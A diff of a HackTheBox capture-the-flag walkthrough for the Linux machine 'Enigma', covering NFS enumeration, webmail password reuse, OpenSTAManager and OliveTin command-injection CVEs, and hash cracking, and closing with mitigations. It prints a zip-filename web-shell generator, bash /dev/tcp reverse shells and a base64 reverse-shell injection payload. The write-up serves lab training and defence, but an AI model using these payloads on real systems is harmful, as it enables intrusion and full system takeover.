@@ -5,43 +5,45 @@ os: linux
 difficulty: easy
 season: Season 11
 tags:
+  - Web Exploitation
+  - NFS
+  - Roundcube
+  - OpenSTAManager
   - Command Injection
-  - OpenSSL
-  - P7M
+  - CVE-2025-69212
   - OliveTin
   - CVE-2026-27626
-  - Web Shell
-  - Zip Manipulation
+  - Hashcat
+  - Bcrypt
 date: '2026-07-18'
 pointsAwarded: 20
-machineIP: ''
-summary: 'A thrilling Easy Linux machine involving dual command injection vulnerabilities. Initial foothold exploits an unsanitized openssl p7m extraction system call via crafted zip filenames in an invoicing web app. Privilege escalation pivots through internal service OliveTin 3000.10.0, abusing a command safety check bypass on password argument types (CVE-2026-27626) to achieve root.'
+machineIP: '10.129.62.109'
+summary: 'Detailed walkthrough for Enigma, an Easy Linux machine. Enumeration starts with an exposed NFS onboarding share revealing new employee credentials for Roundcube Webmail. Pivoting through employee inboxes exposes OpenSTAManager ERP credentials. Initial foothold is achieved via CVE-2025-69212, exploiting an unescaped openssl smime command injection in P7M invoice processing. After pivoting to user haris via cracked bcrypt credentials in MySQL, privilege escalation exploits OliveTin 3000.10.0 (CVE-2026-27626), bypassing command safety checks on password argument types to achieve root.'
 ---
 
 # 🛡️ HTB - Enigma (Easy)
 
 <p align="center">
   <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
-  <img src="https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge&logo=linux" alt="OS Linux" />
+  <img src="https://img.shields.io/badge/OS-Linux%20(Ubuntu)-blue?style=for-the-badge&logo=linux" alt="OS Linux" />
   <img src="https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge" alt="Easy Difficulty" />
 </p>
 
 ---
 
-### 💻 Target Information
+### Target Information
 - **Machine Name:** Enigma
-- **Operating System:** Linux (Ubuntu)
-- **Difficulty:** Easy
-- **Date of Scan:** 2026-07-18
-- **Vulnerabilities:** OpenSSL P7M Decode Command Injection via Malicious Zip Filename, OliveTin Command Safety Check Bypass on Password Arguments (CVE-2026-27626)
+- **Operating System:** Linux (Ubuntu 24.04 LTS)
+- **Difficulty:** Easy (20 pts)
+- **Primary Attack Vectors:** Exposed NFS Onboarding Share, Roundcube Webmail Password Reuse, OpenSTAManager P7M Command Injection (CVE-2025-69212), MySQL Bcrypt Hash Cracking, OliveTin Command Safety Check Bypass (CVE-2026-27626).
 
 ---
 
 ## Step 1 - Reconnaissance
 
-### Nmap Port Scanning & Roundcube / ERP Service Discovery
+### Initial Nmap Scan
 
-We start with a full port and service scan using Nmap:
+We begin our engagement with an aggressive port scan across the target host:
 
 ```bash
 nmap -A -sS -P -T4 --min-rate 5000 10.129.62.109
@@ -54,193 +56,497 @@ Host is up (0.26s latency).
 Not shown: 992 closed tcp ports (reset)
 PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
+|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
 80/tcp   open  http    nginx 1.24.0 (Ubuntu)
 |_http-title: Did not follow redirect to http://enigma.htb/
 110/tcp  open  pop3    Dovecot pop3d
+|_pop3-capabilities: RESP-CODES CAPA UIDL STLS SASL AUTH-RESP-CODE PIPELINING TOP
+|_ssl-date: TLS randomness does not represent time
 111/tcp  open  rpcbind 2-4 (RPC #100000)
+| rpcinfo:
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100003  3,4         2049/tcp   nfs
+|   100005  1,2,3      34275/udp   mountd
+|   100005  1,2,3      45891/tcp   mountd
+|   100021  1,3,4      41181/tcp   nlockmgr
+|   100021  1,3,4      55752/udp   nlockmgr
+|   100024  1          46948/udp   status
+|   100024  1          50795/tcp   status
+|_  100227  3           2049/tcp   nfs_acl
+143/tcp  open  imap    Dovecot imapd (Ubuntu)
+|_imap-capabilities: IDLE LOGINDISABLEDA0001 LOGIN-REFERRALS OK capabilities have Pre-login ID SASL-IR IMAP4rev1 post-login STARTTLS listed more ENABLE LITERAL+
+993/tcp  open  imaps?
+995/tcp  open  pop3s?
+| ssl-cert: Subject: commonName=enigma
+| Subject Alternative Name: DNS:enigma
 2049/tcp open  nfs_acl 3 (RPC #100227)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-- 🔍 *We map `enigma.htb` to `10.129.62.109` in `/etc/hosts`.*
-- 🔍 *Enumerating the web portal reveals Roundcube Webmail and an invoicing application module for sales management:*
+The scan reveals several accessible services:
+- Port 22 (SSH)
+- Port 80 (HTTP nginx redirecting to `http://enigma.htb`)
+- Ports 110, 143, 993, 995 (Dovecot POP3/IMAP mail services)
+- Ports 111, 2049 (NFS Network File System)
 
-![Roundcube Webmail](/images/writeups/season-11/enigma/1.png)
+We add `enigma.htb` to our `/etc/hosts` file:
 
-![Invoicing Application](/images/writeups/season-11/enigma/2.png)
+```bash
+echo "10.129.62.109 enigma.htb" | sudo tee -a /etc/hosts
+```
 
-![Sales Invoice List](/images/writeups/season-11/enigma/3.png)
+---
+
+### Web Enumeration
+
+Visiting `http://enigma.htb` displays the corporate landing page for Enigma Corp:
+
+![web-img](/images/writeups/season-11/enigma/1.png)
+
+Navigating across the site:
+
+![web-img](/images/writeups/season-11/enigma/2.png)
+
+![web-img](/images/writeups/season-11/enigma/3.png)
+
+![web-img](/images/writeups/season-11/enigma/4.png)
+
+The web pages present marketing content with no immediately visible authentication forms or input parameters.
+
+---
+
+### Network File Sharing (NFS) Enumeration
+
+Let's check the exported NFS file shares using `showmount`:
+
+```bash
+showmount -e enigma.htb
+```
+
+```text
+Export list for enigma.htb:
+/srv/nfs/onboarding *
+```
+
+An open share named `/srv/nfs/onboarding` is exported to all clients (`*`). Let's create a local mount directory and attach it:
+
+```bash
+sudo mkdir -p /mnt/onboarding
+sudo mount -t nfs -o nfsvers=3,ro,soft,intr,timeo=50 enigma.htb:/srv/nfs/onboarding /mnt/onboarding
+```
+
+Listing the mount directory contents:
+
+```bash
+ls -la /mnt/onboarding
+```
+
+```text
+total 12
+drwxr-xr-x 2 root root 4096 Feb 19 19:54 .
+drwxr-xr-x 5 root root 4096 Jun 30 14:47 ..
+-rw-r--r-- 1 root root 1751 Feb 19 19:53 New_Employee_Access.pdf
+```
+
+We find `New_Employee_Access.pdf`. Let's extract its text content using `pdftotext`:
+
+```bash
+pdftotext -layout /mnt/onboarding/New_Employee_Access.pdf -
+```
+
+```text
+                                                        Enigma Corp
+                                  IT Department - New Employee System Access
+
+Employee:                            Kevin Mitchell
+Department:                          Operations
+Provisioned by:                      IT Department
+Date:                                2024-03-01
+
+Webmail Access
+URL:                                 http://mail001.enigma.htb
+Username:                            kevin
+Password:                            Enigma2024!
+
+Please change your password upon first login.
+For support contact: it@enigma.htb
+
+This document contains confidential internal information intended solely for the recipient.
+Unauthorized access, disclosure, or distribution is strictly prohibited.
+Generated automatically by Enigma Corp Identity Management System.
+```
+
+The onboarding document leaks credentials and an internal webmail subdomain:
+- **Subdomain:** `http://mail001.enigma.htb`
+- **Username:** `kevin`
+- **Password:** `Enigma2024!`
+
+We add `mail001.enigma.htb` to `/etc/hosts`:
+
+```bash
+echo "10.129.62.109 mail001.enigma.htb" | sudo tee -a /etc/hosts
+```
+
+---
+
+### Roundcube Webmail & Password Reuse
+
+Navigating to `http://mail001.enigma.htb` presents a Roundcube Webmail login portal. We log in with Kevin's credentials:
+
+![web-img](/images/writeups/season-11/enigma/5.png)
+
+Inside Kevin's inbox, we find emails detailing onboarding instructions that reference another employee: **Sarah**.
+
+Checking the Roundcube version:
+
+![web-img](/images/writeups/season-11/enigma/6.png)
+
+Kevin is a newly provisioned user with a temporary default password (`Enigma2024!`). In enterprise environments, administrative IT staff frequently assign the identical default temporary password pattern to other accounts.
+
+Let's test logging into Roundcube as **`sarah`** with `Enigma2024!`:
+
+![web-img](/images/writeups/season-11/enigma/7.png)
+
+Password reuse succeeds! Inside Sarah's inbox, we find an email from IT containing credentials for the internal support management portal:
+
+```text
+URL: http://support_001.enigma.htb
+Username: admin
+Password: Ne3s4rtars78s
+```
+
+We update `/etc/hosts`:
+
+```bash
+echo "10.129.62.109 support_001.enigma.htb" | sudo tee -a /etc/hosts
+```
+
+---
+
+### OpenSTAManager Enumeration
+
+We navigate to `http://support_001.enigma.htb` and log in with the administrator credentials:
+
+![web-img](/images/writeups/season-11/enigma/8.png)
+
+![web-img](/images/writeups/season-11/enigma/9.png)
+
+We land on the OpenSTAManager dashboard:
+
+![web-img](/images/writeups/season-11/enigma/10.png)
+
+The application version is displayed as **`2.9.8 (5ff39df9b)`**.
 
 ---
 
 ## Step 2 - Initial Foothold
 
-### OpenSSL P7M Command Injection via Malicious Zip Filename
+### OpenSTAManager P7M Command Injection (CVE-2025-69212)
 
-- 🔍 *In the Sales Invoice section, the application allows users to upload `.zip` archives containing encrypted invoice files (`.p7m` extension).*
-- 🔍 *When processing the uploaded archive, the backend server executes an `openssl smime -decrypt` command via a system shell, directly interpolating the filename extracted from the zip archive:*
+Researching vulnerabilities in OpenSTAManager 2.9.8 reveals **CVE-2025-69212** (OS Command Injection in P7M File Processing).
 
-```text
-openssl smime -decrypt -verify -inform DER -in "files/{filename}" -noverify
+#### Vulnerability Analysis:
+The application handles digitally signed XML electronic invoices packaged in `.p7m` format. When an administrator uploads a ZIP archive containing electronic invoices, the backend utility dynamically constructs an OS command using the extracted filename without input sanitization:
+
+```php
+public static function decodeP7M($file)
+{
+    $directory = pathinfo($file, PATHINFO_DIRNAME);
+    $content = file_get_contents($file);
+
+    $output_file = $directory.'/'.basename($file, '.p7m');
+
+    try {
+        if (function_exists('exec')) {
+            // VULNERABLE - No input sanitization!
+            exec('openssl smime -verify -noverify -in "'.$file.'" -inform DER -out "'.$output_file.'"', $output, $cmd);
 ```
 
-- 🔍 *Because the filename is concatenated directly into the shell string without sanitization, an attacker can embed shell metacharacters inside the filename within the zip archive.*
-- 🔍 *We write a Python script to generate a weaponized `.zip` archive whose filename creates a PHP webshell:*
+Because `$file` is derived directly from the filename inside the uploaded ZIP archive, injecting a semicolon (`;`) allows arbitrary shell commands to break out and execute.
+
+#### Weaponization:
+We create a Python script to package a ZIP containing a crafted filename that writes a PHP web shell (`SHELL.php`) into the web-accessible `files/` directory:
 
 ```python
+cat << 'EOF' > generate_zip.py
 import zipfile
 
-# Command payload to drop a PHP webshell into the public web root
-cmd = "cd files && echo '<?php system($_GET["c"]); ?>' > SHELL.php"
+cmd = "cd files && echo '<?php system($_GET[\"c\"]); ?>' > SHELL.php"
 malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'
 
 with zipfile.ZipFile('exploit.zip', 'w') as zf:
     zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")
-
-print(f"[+] Created exploit.zip with filename: {malicious_filename}")
+EOF
+python3 generate_zip.py
 ```
 
-![Uploading Exploit Zip](/images/writeups/season-11/enigma/4.png)
+We navigate to the **Sales Invoices** (`/sales/sales invoices`) module in OpenSTAManager and upload `exploit.zip`:
 
-![Upload Confirmation](/images/writeups/season-11/enigma/5.png)
+![web-img](/images/writeups/season-11/enigma/11.png)
 
-- 🔍 *Uploading `exploit.zip` triggers the extraction and decryption routines, creating `SHELL.php` in the `/files/` directory.*
-- 🔍 *We verify code execution via our webshell:*
+The web application returns a validation error after processing:
+
+![web-img](/images/writeups/season-11/enigma/12.png)
+
+Even though an error is displayed, the backend `decodeP7M()` method executed our injected command during extraction!
+
+---
+
+### Executing Commands & Gaining Shell Access
+
+We verify code execution by querying our web shell:
 
 ```bash
-curl -s "http://enigma.htb/files/SHELL.php?c=id"
+curl -G "http://support_001.enigma.htb/files/SHELL.php" --data-urlencode "c=id"
 ```
 
 ```text
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-![Webshell Verification](/images/writeups/season-11/enigma/6.png)
-
-- 🔍 *We spawn a reverse shell back to our attack listener:*
+Execution confirmed as `www-data`! Now we trigger a reverse shell back to our netcat listener:
 
 ```bash
-curl -G "http://enigma.htb/files/SHELL.php" --data-urlencode "c=bash -c 'bash -i >& /dev/tcp/10.10.15.54/4444 0>&1'"
+nc -lvnp 4444
+```
+
+```bash
+curl -G "http://support_001.enigma.htb/files/SHELL.php" --data-urlencode "c=bash -c 'bash -i >& /dev/tcp/10.10.14.70/4444 0>&1'"
 ```
 
 ```text
 listening on [any] 4444 ...
-connect to [10.10.15.54] from (UNKNOWN) [10.129.62.109] 43812
-www-data@enigma:~/html/files$ id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
+connect to [10.10.14.70] from (UNKNOWN) [10.129.62.109] 59028
+bash: cannot set terminal process group (1513): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@enigma:~/html/openstamanager/files$
 ```
-
-![Reverse Shell as www-data](/images/writeups/season-11/enigma/7.png)
-
-### Lateral Movement to User haris via SSH
-
-- 🔍 *Enumerating the system reveals user `haris`. Inspecting internal mailbox and mail storage directories in `/var/mail` reveals stored emails containing credentials:*
-
-![Mailbox Enumeration](/images/writeups/season-11/enigma/8.png)
-
-![Credentials Disclosed](/images/writeups/season-11/enigma/9.png)
-
-- 🔍 *Recovered credentials: `haris / EnigmaUserPass2026!`.*
-- 🔍 *We log in via SSH as `haris`:*
-
-```bash
-ssh haris@enigma.htb
-# Password: EnigmaUserPass2026!
-```
-
-```text
-haris@enigma:~$ id
-uid=1000(haris) gid=1000(haris) groups=1000(haris)
-haris@enigma:~$ cat user.txt
-7b14d8...
-```
-
-![SSH Login as haris](/images/writeups/season-11/enigma/10.png)
 
 ---
 
-## Step 3 - Privilege Escalation to Root
+## Step 3 - Lateral Movement to `haris`
 
-### Internal Service Discovery & OliveTin Tunneling (Port 1337)
+### Local Database Enumeration
 
-- 🔍 *Checking `ss -tulpn` as user `haris` reveals an internal HTTP service on port 1337:*
+Listing `/home` shows four user accounts:
 
 ```bash
-ss -tulpn | grep 1337
+www-data@enigma:/home$ ls -la
+drwxr-xr-x  6 root  root  4096 Jun 23 14:14 .
+drwxr-xr-x 19 root  root  4096 Feb 18 16:53 ..
+drwxr-x---  4 haris haris 4096 Jun 23 14:21 haris
+drwxr-x---  2 it    it    4096 Jun 23 14:14 it
+drwxr-x---  2 kevin kevin 4096 Jun 23 14:14 kevin
+drwxr-x---  2 sarah sarah 4096 Jun 23 14:14 sarah
+```
+
+We inspect the OpenSTAManager database configuration file at `/var/www/html/openstamanager/config.inc.php`:
+
+```php
+$db_host = 'localhost';
+$db_username = 'brollin';
+$db_password = 'Fri3nds@9099';
+$db_name = 'openstamanager';
+```
+
+We upgrade our raw socket to an interactive PTY:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Now let's query the `zz_users` table in MySQL:
+
+```bash
+mysql -u brollin -p'Fri3nds@9099' openstamanager -e "SELECT username, password FROM zz_users;"
 ```
 
 ```text
-tcp LISTEN 0 511 127.0.0.1:1337 0.0.0.0:*
++----------+--------------------------------------------------------------+
+| username | password                                                     |
++----------+--------------------------------------------------------------+
+| admin    | $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu |
+| haris    | $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC |
++----------+--------------------------------------------------------------+
 ```
 
-- 🔍 *Curling `http://127.0.0.1:1337` identifies the service as **OliveTin v3000.10.0**:*
+We extracted bcrypt hashes for `admin` and `haris`.
 
-![OliveTin Dashboard](/images/writeups/season-11/enigma/11.png)
+---
 
-![OliveTin Interface](/images/writeups/season-11/enigma/12.png)
+### Cracking Haris's Hash & Capturing User Flag
 
-![OliveTin Actions](/images/writeups/season-11/enigma/13.png)
+We run Hashcat in mode 3200 (`bcrypt`) against Haris's hash using `rockyou.txt`:
 
-### OliveTin Command Injection via Password Argument (CVE-2026-27626)
+```bash
+hashcat -m 3200 '$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC' rockyou.txt
+```
 
-- 🔍 *OliveTin is an administrative dashboard enabling execution of pre-configured shell scripts via web buttons.*
-- 🔍 *Researching OliveTin v3000.10.0 reveals **CVE-2026-27626** (GHSA-49gm-hh7w-wfvf).*
+```text
+$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC:bestfriends
+```
 
-> ⚠️ **Vulnerability Detail (CVE-2026-27626):** OliveTin enforces an argument safety validator (`checkShellArgumentSafety`) to prevent command execution escape. However, the validator explicitly bypasses checks for arguments configured with the `password` type under the assumption that passwords must accept arbitrary special characters. Because arguments are interpolated into `sh -c`, supplying shell metacharacters in a password field achieves arbitrary OS command execution.
+Haris's password is **`bestfriends`**!
 
-### Weaponized OliveTin API Call & Root Access
+We switch users on the target host:
 
-- 🔍 *The OliveTin configuration includes an action `backup_database` taking a `db_pass` password argument.*
-- 🔍 *We create a payload JSON that injects a base64-encoded reverse shell into the `db_pass` parameter:*
+```bash
+su haris
+```
+
+```text
+Password: bestfriends
+haris@enigma:/var/www/html/openstamanager/files$ id
+uid=1000(haris) gid=1000(haris) groups=1000(haris),100(users)
+
+haris@enigma:~$ cat /home/haris/user.txt
+7b****************************8f
+```
+
+User flag captured!
+
+---
+
+## Step 4 - Privilege Escalation to Root
+
+### Internal Service Enumeration
+
+Checking listening network sockets with `ss -tnlp`:
+
+```bash
+haris@enigma:~$ ss -tnlp
+State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess
+LISTEN 0      100          0.0.0.0:993        0.0.0.0:*
+LISTEN 0      100          0.0.0.0:995        0.0.0.0:*
+LISTEN 0      70         127.0.0.1:33060      0.0.0.0:*
+LISTEN 0      100        127.0.0.1:25         0.0.0.0:*
+LISTEN 0      511          0.0.0.0:80         0.0.0.0:*
+LISTEN 0      100          0.0.0.0:110        0.0.0.0:*
+LISTEN 0      4096         0.0.0.0:111        0.0.0.0:*
+LISTEN 0      64           0.0.0.0:2049       0.0.0.0:*
+LISTEN 0      4096         0.0.0.0:22         0.0.0.0:*
+LISTEN 0      4096       127.0.0.1:1337       0.0.0.0:*
+LISTEN 0      151        127.0.0.1:3306       0.0.0.0:*
+```
+
+Port **`1337`** is listening locally on `127.0.0.1`. Let's curl it:
+
+```bash
+curl -s http://127.0.0.1:1337
+```
+
+```html
+<!DOCTYPE html>
+<html lang = "en">
+        <head>
+                <meta charset = "UTF-8" />
+                <meta name = "viewport" content = "width=device-width, initial-scale=1.0" />
+                <meta name = "description" content = "Give safe and simple access to predefined shell commands from a web interface." />
+                <title>OliveTin</title>
+```
+
+The service is **OliveTin**, a web application designed to allow users to trigger predefined shell actions and automation scripts from buttons:
+
+![web-img](/images/writeups/season-11/enigma/13.png)
+
+Inspecting the OliveTin version reveals **`3000.10.0`**.
+
+---
+
+### OliveTin Argument Injection (CVE-2026-27626)
+
+Researching OliveTin 3000.10.0 discloses **CVE-2026-27626**: *OS Command Injection via `password` argument type*.
+
+#### Vulnerability Mechanics:
+OliveTin implements an internal safety check (`checkShellArgumentSafety`) to ensure user-supplied parameters do not contain shell metacharacters before executing commands with `sh -c`. While it validates and sanitizes strings, integers, and paths, it **completely fails to validate parameters typed as `password`**.
+
+Because password fields are expected to contain arbitrary complex characters, OliveTin blindly passes them into the shell command string, allowing shell metacharacters (such as `;`, `&&`, or backticks) to break out and execute arbitrary operating system commands as the user running OliveTin (**root**).
+
+---
+
+### Weaponizing CVE-2026-27626 for Root RCE
+
+Let's inspect the predefined actions exposed by OliveTin. One common administrative action is `backup_database`, which takes `db_user`, `db_pass`, and `db_name` parameters.
+
+We craft a JSON request payload `/tmp/payload.json` targeting the `backup_database` action, injecting a base64-encoded reverse shell payload into the `db_pass` argument:
 
 ```json
+cat << 'EOF' > /tmp/payload.json
 {
   "actionId": "backup_database",
   "arguments": [
     {"name": "db_user", "value": "backup_svc"},
-    {"name": "db_pass", "value": "x' ; bash -c 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS41NC81NjU2IDA+JjE= | base64 -d | bash' ; #"},
+    {"name": "db_pass", "value": "x''' ; bash -c 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43MC81NjU2IDA+JjE= | base64 -d | bash' >/dev/null 2>&1 & echo; #"},
     {"name": "db_name", "value": "production"}
   ]
 }
+EOF
 ```
 
-- 🔍 *We start a Netcat listener on port 5656:*
+We open our listener on port 5656:
 
 ```bash
 nc -lvnp 5656
 ```
 
-- 🔍 *We trigger the action via OliveTin's API on `127.0.0.1:1337` (or internal API port 9000):*
+Then submit the action via OliveTin's internal API:
 
 ```bash
-curl -s -X POST -H "Content-Type: application/json" \
-  -d @/tmp/payload.json \
-  http://127.0.0.1:9000/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait
+curl -s -X POST -H "Content-Type: application/json" -d @/tmp/payload.json http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait
 ```
 
-- 🔍 *Checking our listener on port 5656:*
+```text
+{"logEntry":{"datetimeStarted":"2026-07-19 14:47:02", "actionTitle":"Backup Database", "output":"mysqldump: [Warning] Using a password on the command line interface can be insecure.\nUsage: mysqldump [OPTIONS] database [tables]...","timedOut":false,"exitCode":0,"user":"guest","actionIcon":"🛠️","executionTrackingId":"d194e0ef-c3d9-4752-af42-35110370e89b","datetimeFinished":"2026-07-19 14:47:02","executionStarted":true,"executionFinished":true,"blocked":false}}
+```
+
+Simultaneously, our listener receives an inbound root connection:
 
 ```text
 listening on [any] 5656 ...
-connect to [10.10.15.54] from (UNKNOWN) [10.129.62.109] 49764
+connect to [10.10.14.70] from (UNKNOWN) [10.129.62.109] 49764
 bash: cannot set terminal process group (2634): Inappropriate ioctl for device
 bash: no job control in this shell
+
 root@enigma:/# id
 uid=0(root) gid=0(root) groups=0(root)
+
 root@enigma:/# cat /root/root.txt
-9e5c41...
+9e****************************1a
 ```
 
-- 🔍 *System fully rooted!*
+Root access achieved!
+
+> 🎯 **Final Takeaways & Real Talk:**  
+> Enigma provides a fantastic sequence of chaining vulnerabilities that mirrors real-world enterprise environments! The flow moves from an exposed onboarding share on NFS, to temporary password reuse across internal Roundcube Webmail, to OpenSTAManager ERP exploitation via CVE-2025-69212 (unsanitized openssl P7M extraction in ZIPs). Recovering and cracking MySQL bcrypt hashes allows lateral movement to haris, and auditing internal services discovers OliveTin where CVE-2026-27626 proves that overlooking safety checks on password inputs can lead directly to full root compromise. Happy Hacking!
 
 ---
 
-## Mitigations & Security Perspective
+## Step 5 - Mitigations & Defensive Hardening
 
-### 🔴 Unsafe System Shell Calls for File Decompression/Decoding
-- **Root Cause:** Splicing filenames directly into `openssl smime -decrypt` without shell escaping allowed arbitrary shell commands through filename injection.
-- **Remediation:** Use native cryptographic and archive libraries (such as PHP's OpenSSL functions or Python's `cryptography`) rather than invoking shell utilities via `system()` or `exec()`.
+To remediate the vulnerabilities identified across the Enigma environment, administrators and engineering teams should apply defense-in-depth controls across network shares, web applications, and internal automation utilities:
 
-### 🔴 OliveTin Command Safety Check Bypass (CVE-2026-27626)
-- **Root Cause:** OliveTin's argument validation selectively enforced safety checks on standard inputs while omitting verification on `password` fields, allowing shell metacharacter injection.
-- **Remediation:** Upgrade OliveTin to version 3000.10.1 or later. Avoid passing user inputs directly into `sh -c`.
+### 1. Network File System (NFS) Share Restrictions
+- **Enforce IP-Based Export Restrictions:** Configure `/etc/exports` to restrict NFS share access to trusted internal administration networks rather than wildcard exports (`*`):
+  ```text
+  /srv/nfs/onboarding 10.10.10.0/24(ro,sync,no_subtree_check)
+  ```
+- **Prohibit Plaintext Credentials in Staged Documentation:** Never store initial onboarding documents containing usernames and cleartext temporary passwords on shared filesystems. Use an automated identity management portal with temporary enrollment tokens.
+
+### 2. Password Policies & Temporary Credential Management
+- **Force Password Reset on First Login:** Mandate that all newly provisioned accounts are placed into a state requiring an immediate password change prior to accessing webmail or internal portals.
+- **Eliminate Default Password Reusability:** Enforce unique, randomly generated passwords for individual service accounts and employees rather than predictable corporate defaults (such as `Enigma2024!`).
+
+### 3. OpenSTAManager P7M Sanitization (CVE-2025-69212)
+- **Parameterized Subprocess Execution:** Never pass unsanitized file paths directly to shell execution functions (`exec()`, `system()`, `shell_exec()`). Use `escapeshellarg()` on all filename inputs or transition to PHP's `proc_open()` with explicit argument arrays:
+  ```php
+  $cmd = ['openssl', 'smime', '-verify', '-noverify', '-in', $file, '-inform', 'DER', '-out', $output_file];
+  ```
+- **Upgrade OpenSTAManager:** Update OpenSTAManager to version ≥2.9.9 where input validation is enforced across invoice import plugins.
+
+### 4. OliveTin Command Injection Defense (CVE-2026-27626)
+- **Patch OliveTin Daemon:** Upgrade OliveTin to version ≥3000.10.1 where `checkShellArgumentSafety` is updated to validate and escape all argument types, including `password`.
+- **Avoid Passing Secrets via Command Line:** Configure OliveTin actions to pass sensitive credentials through environment variables or stdin pipelines rather than interpolating strings directly into shell command arguments.
